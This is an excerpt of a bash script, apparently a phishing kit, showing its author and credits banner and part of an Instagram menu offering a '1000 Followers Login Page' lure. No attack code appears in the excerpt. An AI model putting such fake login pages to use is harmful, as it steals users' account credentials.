...
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}Author   ${RED}:  ${BLUE}SHIVAM ADHAU
		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/shivamadhau
		${GREEN}Version  ${RED}:  ${ORANGE}1.23

		${REDBG}${WHITE} Thanks : htr-tech,Adi1090x,MoisesTapia,ThelinuxChoice
								  DarkSecDevelopers,Mustakim Ahmed,1RaY-1,Akshay-Arjun ${RESETBG}
...
site_instagram() {
	cat <<- EOF
		...
		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page(special by shivam adhau)
